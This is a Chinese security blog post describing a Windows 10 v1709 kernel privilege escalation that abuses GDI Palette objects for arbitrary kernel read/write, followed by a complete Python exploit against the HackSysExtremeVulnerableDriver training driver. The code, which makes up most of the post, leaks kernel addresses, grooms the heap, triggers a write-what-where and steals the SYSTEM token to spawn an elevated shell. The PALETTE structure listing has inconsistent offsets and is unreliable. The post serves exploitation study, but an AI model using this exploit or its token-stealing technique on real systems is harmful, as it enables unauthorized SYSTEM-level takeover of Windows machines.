> 原文链接: https://www.anquanke.com//post/id/168572 


# Windows10 v1709特权提升：GDI Palette滥用


                                阅读量   
                                **218433**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01f4a58ca6cf0d7247.jpg)](https://p1.ssl.qhimg.com/t01f4a58ca6cf0d7247.jpg)



## 0x001 前言

最近对Windows10内核提权比较感兴趣，继续研究一下v1709版本，先回顾我们前几篇文章：

[Windows特权提升：GDI Bitmap滥用](https://www.anquanke.com/post/id/156519)

[Windows10 v1607内核提权技术的发展——利用AcceleratorTable](https://www.anquanke.com/post/id/168356)

[Windows10 v1703基于桌面堆泄露的内核提权技术 ](https://www.anquanke.com/post/id/168441)

以往我们都会采用Bitmap objects来构造RW primitive，但从v1709开始，微软将Bitmap header与Bitmap data部分分离，无法通过Bitmap header取得pvscan0指针的内核地址，Bitmap Abuse的方法失效

[![](https://p1.ssl.qhimg.com/t01f53474273a1a251b.png)](https://p1.ssl.qhimg.com/t01f53474273a1a251b.png)

现在，我们来关注另一种GDI结构Palette objects，研究如何用于Windows10 1709 Kernel Privilege Escalation



## 0x002 PALETTE RW Primitive

有了前几篇文章的基础，我们直接进入正题

通过文档，可以了解到PALETTE的结构

```
typedef struct _PALETTE64
`{`
    BASEOBJECT64      BaseObject;    // 0x00
    FLONG           flPal;         // 0x18
    ULONG32           cEntries;      // 0x1C
    ULONG32           ulTime;        // 0x20 
    HDC             hdcHead;       // 0x24
    ULONG64        hSelected;     // 0x28, 
    ULONG64           cRefhpal;      // 0x30
    ULONG64          cRefRegular;   // 0x34
    ULONG64      ptransFore;    // 0x3c
    ULONG64      ptransCurrent; // 0x44
    ULONG64      ptransOld;     // 0x4C
    ULONG32           unk_038;       // 0x38
    ULONG64         pfnGetNearest; // 0x3c
    ULONG64   pfnGetMatch;   // 0x40
    ULONG64           ulRGBTime;     // 0x44
    ULONG64       pRGBXlate;     // 0x48
    PALETTEENTRY    *pFirstColor;  // 0x80
    struct _PALETTE *ppalThis;     // 0x88
    PALETTEENTRY    apalColors[3]; // 0x90
`}`
```

PALETTE偏移0x90处是PALETTEENTRY，一个4个bytes的数组，偏移0x80处的pFirstColor是一个指向该数组的指针，就是利用该指针来构造RW primitive，相当于Bitmap里的pvScan0指针

```
class PALETTEENTRY(Structure):
 _fields_ = [
  ("peRed", BYTE),
  ("peGreen", BYTE),
  ("peBlue", BYTE),
  ("peFlags", BYTE)
 ]
```

调用以下API创建一个PALETTE

```
HPALETTE CreatePalette(
  _In_ const LOGPALETTE *lplgpl
);
```

LOGPALETTE是这样的一个结构

```
class LOGPALETTE(Structure):
 _fields_ = [
  ("palVersion", WORD),
  ("palNumEntries", WORD),
  ("palPalEntry", POINTER(PALETTEENTRY))
 ]
```

这样创建一个PALETTE，注意一下palNumEntries的计算

```
logPalette = LOGPALETTE()
logPalette.palNumEntries = 0x3DC; # size: 0x1000; (SIZE - 0x90) / 4; 0x90 = size of _PALETTE64 struct
logPalette.palVersion = 0x300
gdi32.CreatePalette.restype = HPALETTE
gdi32.CreatePalette.argtypes = [POINTER(LOGPALETTE)]
hManager = gdi32.CreatePalette(byref(logPalette))
```

还记得吗？GetBitmapBits、SetBitmapBits用来操纵Pixel区的数据，被我们恶意利用后可以读写内核数据。关于PALETTE的操作也有类似的API：

```
UINT GetPaletteEntries(
  _In_  HPALETTE       hpal,
  _In_  UINT           iStartIndex,
  _In_  UINT           nEntries,
  _Out_ LPPALETTEENTRY lppe
);

UINT SetPaletteEntries(
  _In_       HPALETTE     hpal,
  _In_       UINT         iStart,
  _In_       UINT         cEntries,
  _In_ const PALETTEENTRY *lppe
);
```

具体的攻击过程类似Bitmap Abuse，可以用以下图片来总结：

[![](https://p1.ssl.qhimg.com/t01eeece971d766ce7c.png)](https://p1.ssl.qhimg.com/t01eeece971d766ce7c.png)

Palette A、Palette B分别是Manager object、Work object，通过Palette A修改Palette的pFirstColor指针，最后调用GetPaletteEntries、SetPaletteEntries实现对内核数据的任意读写



## 0x003 How to Exploit it?

关于利用过程大体上跟以往的几篇文章类似，这里不再赘述，简单说一下过程：

首先取得`HMValidateHandle`的调用地址，计算得到`lpszMenuName`的地址，该指针指向`“PALETTE结构”(预测)`，以下过程跟v1703上利用一致

```
pIsMenu --&gt; pHMValidateHandle --&gt; pWnd = HMValidateHandle(hWnd,1)，返回tagWND对象指针，用户桌面堆地址 
--&gt; pSelf=pWnd+0x20，得到内核桌面堆地址、kernelTagCLS=pWnd+0xa8，得到内核TagCLS地址
--&gt; ulClientDelta=pSelf-pWnd，这是桌面堆用户模式映射与内核映射的偏移
--&gt; userTagCLS=kernelTagCLS-ulClientDelta，取得用户TagCLS地址，lpszMenuName位于0x90偏移处(该处指向paged pool)
```

后续利用过程：

1.依次分配hManager、hWorker两个Palette object，并利用UAF的方法预测得到各自pFirstColor指针的内核地址；

2.将hManager的pFirstColor指针指向hWorker的pFirstColor指针的存放地址，利用HEVD模块的任意写漏洞；

3.查询获得当前进程与system进程的token；

4.调用API SetPaletteEntries、GetPaletteEntries，将system进程的token写入当前进程；

重要的几个偏移记得修改一下

[![](https://p0.ssl.qhimg.com/t013f3ebca7386a705f.png)](https://p0.ssl.qhimg.com/t013f3ebca7386a705f.png)

枚举获得HMValidateHandle调用地址

[![](https://p5.ssl.qhimg.com/t01727c53a3cae3d5ec.png)](https://p5.ssl.qhimg.com/t01727c53a3cae3d5ec.png)

重用`lpszMenuName`释放的内存，预测得到hManager、hWorker的`pFirstColor`指针内核地址

[![](https://p2.ssl.qhimg.com/t018bd1136f0eaf2091.png)](https://p2.ssl.qhimg.com/t018bd1136f0eaf2091.png)

完整的EXP

```
import ctypes, struct, sys, os, win32con, time
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

def debug_print(message):
    """ Prints message in terminal and debugger """
    print message
    kernel32.OutputDebugStringA(message + "n")


class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]

def get_base_address(input_modules):
    """ Returns base address of kernel modules """
    modules = `{``}`

    # Allocate arbitrary buffer and call NtQuerySystemInformation
    system_information = create_string_buffer(0)
    systeminformationlength = c_ulong(0)
    ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))

    # Call NtQuerySystemInformation second time with right size
    system_information = create_string_buffer(systeminformationlength.value)
    ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))

    # Read first 4 bytes which contains number of modules retrieved
    module_count = c_ulong(0)
    module_count_string = create_string_buffer(system_information.raw[:8])
    ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))

    # Marshal each module information and store it in a dictionary&lt;name, SYSTEM_MODULE_INFORMATION&gt;
    system_information = create_string_buffer(system_information.raw[8:])
    for x in range(module_count.value):
        smi = SYSTEM_MODULE_INFORMATION()
        temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
        ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
        module_name =  smi.FullPathName.split('\')[-1]
        modules[module_name] = smi

    debug_print("rn[&gt;] NtQuerySystemInformation():")

    # Get base addresses and return them in a list
    base_addresses = []
    for input_module in input_modules:
        try:
            base_address = modules[input_module].ImageBase
            debug_print ("t[+] %s base address: 0x%X" % (input_module, base_address))
            base_addresses.append(base_address)
        except:
            base_addresses.append(0)

    return base_addresses


def get_PsISP_kernel_address():    
    """ Returns kernel base address of PsInitialSystemProcess """
    # Get kernel image base
    kernelImage = "ntoskrnl.exe"
    base_addresses = get_base_address(kernelImage.split())
    kernel_image_base = base_addresses[0]
    debug_print("[+] Nt Base Address: 0x%X" % kernel_image_base)

    # Load kernel image in userland and get PsInitialSystemProcess offset
    kernel32.LoadLibraryA.restype = HMODULE
    hKernelImage = kernel32.LoadLibraryA(kernelImage)
    debug_print("[+] Loading %s in Userland" % kernelImage)
    debug_print("[+] %s Userland Base Address : 0x%X" % (kernelImage, hKernelImage))
    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
    PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
    debug_print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)

    # Calculate PsInitialSystemProcess offset in kernel land
    PsISP_kernel_address_ptr = kernel_image_base + ( PsISP_user_address - hKernelImage)
    debug_print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)

    PsISP_kernel_address = c_ulonglong()
    read_virtual(PsISP_kernel_address_ptr, byref(PsISP_kernel_address), sizeof(PsISP_kernel_address));    

    return PsISP_kernel_address.value


pHMValidateHandle = None    

def findHMValidateHandle():
    """ Searches for HMValidateHandle() function """
    global pHMValidateHandle

    kernel32.LoadLibraryA.restype = HMODULE
    hUser32 = kernel32.LoadLibraryA("user32.dll")

    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
    pIsMenu = kernel32.GetProcAddress(hUser32, "IsMenu")

    debug_print("[&gt;] Locating HMValidateHandle()")

    debug_print("t[+] user32.IsMenu: 0x%X" % pIsMenu)

    pHMValidateHandle_offset = 0

    offset = 0
    while (offset &lt; 0x100):
        tempByte = cast(pIsMenu + offset, POINTER(c_byte))
        # if byte == 0xE8
        if tempByte.contents.value == -24:
            pHMValidateHandle_offset = pIsMenu + offset + 1
            break
        offset = offset + 1

    debug_print("t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset)

    HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
    #debug_print("t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset)

    # Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
    pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb

    debug_print("t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle)


WNDPROCTYPE = WINFUNCTYPE(c_int, HWND, c_uint, WPARAM, LPARAM)

class WNDCLASSEX(Structure):
    _fields_ = [("cbSize", c_uint),
                ("style", c_uint),
                ("lpfnWndProc", WNDPROCTYPE),
                ("cbClsExtra", c_int),
                ("cbWndExtra", c_int),
                ("hInstance", HANDLE),
                ("hIcon", HANDLE),
                ("hCursor", HANDLE),
                ("hBrush", HANDLE),
                ("lpszMenuName", LPCWSTR),
                ("lpszClassName", LPCWSTR),
                ("hIconSm", HANDLE)]

def PyWndProcedure(hWnd, Msg, wParam, lParam):
    """ Callback Function for CreateWindow() """
    # if Msg == WM_DESTROY
    if Msg == 2:
        user32.PostQuitMessage(0)
    else:
        return user32.DefWindowProcW(hWnd, Msg, wParam, lParam)
    return 0

classNumber = 0

def allocate_free_window():
    """ Allocate and Free a single Window """
    global classNumber, pHMValidateHandle

    # Create prototype for HMValidateHandle()
    HMValidateHandleProto = WINFUNCTYPE (c_ulonglong, HWND, c_int)
    HMValidateHandle = HMValidateHandleProto(pHMValidateHandle)

    WndProc = WNDPROCTYPE(PyWndProcedure)
    hInst = kernel32.GetModuleHandleA(0)

    # instantiate WNDCLASSEX 
    wndClass = WNDCLASSEX()
    wndClass.cbSize = sizeof(WNDCLASSEX)
    wndClass.lpfnWndProc = WndProc
    wndClass.cbWndExtra = 0
    wndClass.hInstance = hInst
    wndClass.lpszMenuName = 'A' * 0x7F0 # Size: 0x1000
    wndClass.lpszClassName = "Class_" + str(classNumber)

    # Register Class and Create Window
    hCls = user32.RegisterClassExW(byref(wndClass))
    hWnd = user32.CreateWindowExA(0,"Class_" + str(classNumber),'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)

    # Run HMValidateHandle on Window handle to get a copy of it in userland
    pWnd = HMValidateHandle(hWnd,1)

    #debug_print ("t[+] pWnd: 0x%X" % pWnd)

    # Read pSelf from copied Window
    kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value

    #debug_print ("t[+] kernelpSelf: 0x%X" % kernelpSelf)

    # Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle())
    # pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap
    ulClientDelta = kernelpSelf - pWnd

    # Read tagCLS from copied Window
    kernelTagCLS = (cast(pWnd+0xa8, POINTER(c_ulonglong))).contents.value

    #debug_print ("t[+] kernelTagCLS: 0x%X" % kernelTagCLS)

    # Calculate user-land tagCLS location: tagCLS - ulClientDelta
    userTagCLS = kernelTagCLS - ulClientDelta

    #debug_print ("t[+] userTagCLS: 0x%X" % userTagCLS)

    # Calculate kernel-land tagCLS.lpszMenuName
    tagCLS_lpszMenuName = (cast (userTagCLS+0x98, POINTER(c_ulonglong))).contents.value

    #debug_print ("t[+] tagCLS_lpszMenuName: 0x%X" % tagCLS_lpszMenuName)

    # Destroy Window
    user32.DestroyWindow(hWnd)

    # Unregister Class
    user32.UnregisterClassW(c_wchar_p("Class_" + str(classNumber)), hInst)

    return tagCLS_lpszMenuName


def alloc_free_windows():
    """ Calls alloc_free_window() until current address matches previous one """
    global classNumber

    previous_entry = 0

    while (1):
        plpszMenuName = allocate_free_window()
        if previous_entry == plpszMenuName:
            return plpszMenuName
        previous_entry = plpszMenuName
        classNumber = classNumber + 1 

hManager = HPALETTE()
hWorker = HPALETTE()

class PALETTEENTRY(Structure):
    _fields_ = [("peRed", BYTE),
                ("peGreen", BYTE),
                ("peBlue", BYTE),
                ("peFlags", BYTE)]

class LOGPALETTE(Structure):
    _fields_ = [("palVersion", WORD),
                ("palNumEntries", WORD), 
                ("palPalEntry", POINTER(PALETTEENTRY))]

def setup_manager_palette():
    """ Creates Manager Palette """
    global hManager

    logPalette = LOGPALETTE()
    logPalette.palNumEntries = 0x3DC; # size: 0x1000; (SIZE - 0x90) / 4; 0x90 = size of _PALETTE64 struct
    logPalette.palVersion = 0x300
    gdi32.CreatePalette.restype = HPALETTE
    gdi32.CreatePalette.argtypes = [POINTER(LOGPALETTE)]
    hManager = gdi32.CreatePalette(byref(logPalette))
    debug_print ("t[+] Manager Palette handle: 0x%X" % hManager)

def setup_worker_palette():
    """ Creates Worker Palette """
    global hWorker

    logPalette = LOGPALETTE()
    logPalette.palNumEntries = 0x3DC; # size: 0x1000; (SIZE - 0x90) / 4; 0x90 = size of _PALETTE64 struct
    logPalette.palVersion = 0x300
    gdi32.CreatePalette.restype = HPALETTE
    gdi32.CreatePalette.argtypes = [POINTER(LOGPALETTE)]
    hWorker = gdi32.CreatePalette(byref(logPalette))
    debug_print ("t[+] Worker Palette handle: 0x%X" % hWorker)

def set_address(address):
    """ Sets pFirstColor value of Worker Bitmap     """
    global hManager
    address = c_ulonglong(address)
    gdi32.SetPaletteEntries.argtypes = [HPALETTE, c_ulong, c_ulong, LPVOID]
    gdi32.SetPaletteEntries(hManager, 0, sizeof(address) / 4, addressof(address));

def write_virtual(dest, src, len):
    """ Writes value pointed at by Worker Palette """
    global hWorker
    set_address(dest)
    gdi32.SetPaletteEntries.argtypes = [HPALETTE, c_ulong, c_ulong, LPVOID]
    gdi32.SetPaletteEntries(hWorker, 0, len / 4, src) # reads 4 bytes at a time

def read_virtual(src, dest, len):
    """ Reads value pointed at by Worker Palette """
    global hWorker
    set_address(src)
    gdi32.GetPaletteEntries.argtypes = [HPALETTE, c_ulong, c_ulong, LPVOID]
    gdi32.GetPaletteEntries(hWorker, 0, len / 4, dest) # reads 4 bytes at a time

unique_process_id_offset = 0x2e0
active_process_links_offset = 0x2e8
token_offset = 0x358

# Get EPROCESS of current process
def get_current_eprocess(pEPROCESS):
    """ Returns ptr to Current EPROCESS structure """
    flink = c_ulonglong()
    read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));    

    current_pEPROCESS = 0
    while (1):
        unique_process_id = c_ulonglong(0)

        # Adjust EPROCESS pointer for next entry
        pEPROCESS = flink.value - unique_process_id_offset - 0x8

        # Get PID
        read_virtual(pEPROCESS + unique_process_id_offset, byref(unique_process_id), sizeof(unique_process_id));    

        # Check if we're in the current process
        if (os.getpid() == unique_process_id.value):
            current_pEPROCESS = pEPROCESS
            break

        read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));    

        # If next same as last, we've reached the end
        if (pEPROCESS == flink.value - unique_process_id_offset - 0x8):
            break

    return current_pEPROCESS

def trigger_arbitrary_overwrite():
    """ Main Logic """
    driver_handle = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
    if not driver_handle or driver_handle == -1:
        print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
        sys.exit()

    global hManager, hWorker

    # Calculate pointer to HMValidateHandle
    findHMValidateHandle()

    #Massaging heap for Manager Palette
    debug_print ("[&gt;] Setting up Manager Palette:")
    debug_print ("t[+] Allocating and Freeing Windows")
    dup_address = alloc_free_windows()
    setup_manager_palette()
    hManager_pFirstColor_offset = dup_address + 0x78
    debug_print ("t[+] Manager palette pFirstColor offset: 0x%X" % hManager_pFirstColor_offset)

    #Massaging heap for Worker Palette
    debug_print ("[&gt;] Setting up Worker Palette:")
    debug_print ("t[+] Allocating and Freeing Windows")
    dup_address = alloc_free_windows()
    setup_worker_palette()
    hWorker_pFirstColor_offset = dup_address + 0x78
    debug_print ("t[+] Worker palette pFirstColor offset: 0x%X" % hWorker_pFirstColor_offset)

    # Using WWW to overwrite Manager pFirstColor value with address of Worker pFirstColor
    write_where = hManager_pFirstColor_offset
    write_what_ptr = c_void_p(hWorker_pFirstColor_offset)    
    evil_input = struct.pack("&lt;Q", addressof(write_what_ptr)) +     struct.pack("&lt;Q", write_where)
    evil_input_ptr = id(evil_input) + 32
    evil_size  = len(evil_input)
    debug_print ("n[+] Triggering W-W-W to overwrite Manager pFirstColor value with Worker pFirstColor")
    dwReturn = c_ulong()
    kernel32.DeviceIoControl(driver_handle, 0x22200B, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)    

    # Get SYSTEM EPROCESS
    system_EPROCESS = get_PsISP_kernel_address()
    debug_print ("n[+] SYSTEM EPROCESS: 0x%X" % system_EPROCESS)

    # Get current EPROCESS
    current_EPROCESS = get_current_eprocess(system_EPROCESS)
    debug_print ("[+] current EPROCESS: 0x%X" % current_EPROCESS)

    system_token = c_ulonglong()
    debug_print ("rn[+] Reading System TOKEN")
    read_virtual(system_EPROCESS + token_offset, byref(system_token), sizeof(system_token));
    debug_print ("[+] Writing System TOKEN")
    write_virtual(current_EPROCESS + token_offset, byref(system_token), sizeof(system_token));

    if shell.IsUserAnAdmin():
        os.system('cmd.exe')
    else:
        debug_print("[-] Exploit did not work!")

if __name__ == '__main__':
    """ Main Function """
    trigger_arbitrary_overwrite()
```

WIN~<br>[![](https://p1.ssl.qhimg.com/t019e8de202febd9aae.png)](https://p1.ssl.qhimg.com/t019e8de202febd9aae.png)
